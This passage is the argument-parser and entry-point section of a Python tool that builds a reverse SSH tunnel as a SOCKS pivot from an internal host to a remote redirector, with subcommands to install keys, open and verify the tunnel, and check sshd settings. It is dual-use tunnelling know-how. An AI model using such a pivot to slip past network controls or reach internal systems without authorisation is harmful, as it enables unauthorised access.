    sp.add_argument("--via-ssh", help="Install on user@host over existing SSH "
                    "(needs existing key/agent auth; no password automation)")
    sp.add_argument("--print", action="store_true",
                    help="Print the shell one-liner instead of installing")
    sp.set_defaults(func=cmd_install_key)

    sp = sub.add_parser("tunnel", help="[internal] open the reverse tunnel",
                        description="[internal sender] Establish the reverse SSH tunnel. "
                        "Default is a SOCKS pivot on the remote loopback.")
    _add_target_flags(sp)
    mode = sp.add_mutually_exclusive_group()
    mode.add_argument("--socks", action="store_true",
                      help="SOCKS pivot mode (default if neither is given)")
    mode.add_argument("--forward", help="Single-service forward LPORT:HOST:RPORT "
                      "(e.g. 8022:localhost:3389) instead of the SOCKS pivot")
    sp.add_argument("--print-only", action="store_true",
                    help="Print the ssh command instead of running it")
    sp.add_argument("--config-entry", action="store_true",
                    help="Print a ~/.ssh/config block instead of running")
    sp.set_defaults(func=cmd_tunnel)

    sp = sub.add_parser("verify", help="[internal] confirm the forward (client side)",
                        description="[internal sender] Establish a short-lived test forward "
                        "and report PASS/FAIL.")
    _add_target_flags(sp)
    sp.add_argument("--forward", help="Verify a single-service forward LPORT:HOST:RPORT "
                    "instead of the SOCKS pivot")
    sp.add_argument("--test-port", type=int, default=None,
                    help="Remote port for the throwaway test forward "
                         "(default: socks-port + 10000, to avoid colliding with a live tunnel)")
    sp.add_argument("--print-only", action="store_true", help="Print the ssh command")
    sp.add_argument("--timeout", type=float, default=45.0, help="Overall timeout seconds")
    sp.set_defaults(func=cmd_verify)

    sp = sub.add_parser("check", help="[remote] prove traffic flows through the pivot",
                        description="[remote redirector] Confirm the SOCKS listener is up "
                        "and egress works via curl -4 --socks5.")
    sp.add_argument("--socks-port", type=int, default=DEFAULT_SOCKS_PORT,
                    help="SOCKS port (default: %d)" % DEFAULT_SOCKS_PORT)
    sp.add_argument("--url", default="https://icanhazip.com",
                    help="URL to fetch through the proxy (default: https://icanhazip.com)")
    sp.add_argument("--socks5-hostname", action="store_true",
                    help="Resolve DNS at the far (internal) end")
    sp.add_argument("--print", action="store_true", help="Print manual commands and exit")
    sp.set_defaults(func=cmd_check)

    sp = sub.add_parser("preflight", help="[remote] report relevant sshd settings",
                        description="[remote redirector] Report sshd settings relevant to "
                        "the pivot. Changes nothing.")
    sp.add_argument("--sshd-config", default="/etc/ssh/sshd_config",
                    help="Path to sshd_config (default: /etc/ssh/sshd_config)")
    sp.add_argument("--print", action="store_true",
                    help="Skip reading the file; just print guidance")
    sp.set_defaults(func=cmd_preflight)

    sp = sub.add_parser("diagram", help="[any] print a Mermaid diagram of the pivot",
                        description="[any] Print Mermaid syntax you can paste into GitHub "
                        "or mermaid.live to visualize the pivot.")
    sp.add_argument("--sequence", action="store_true",
                    help="Emit a setup sequence diagram instead of the topology")
    sp.add_argument("--socks-port", type=int, default=DEFAULT_SOCKS_PORT,
                    help="SOCKS port shown in the diagram (default: %d)" % DEFAULT_SOCKS_PORT)
    sp.set_defaults(func=cmd_diagram)

    return p


def main(argv=None) -> int:
    """Entry point: parse args and dispatch to the selected subcommand."""
    parser = build_parser()
    args = parser.parse_args(argv)
    if not getattr(args, "func", None):
        parser.print_help()
        return 0
    try:
        return args.func(args)
    except KeyboardInterrupt:
        print("\ninterrupted.", file=sys.stderr)
        return 130


if __name__ == "__main__":
    raise SystemExit(main())
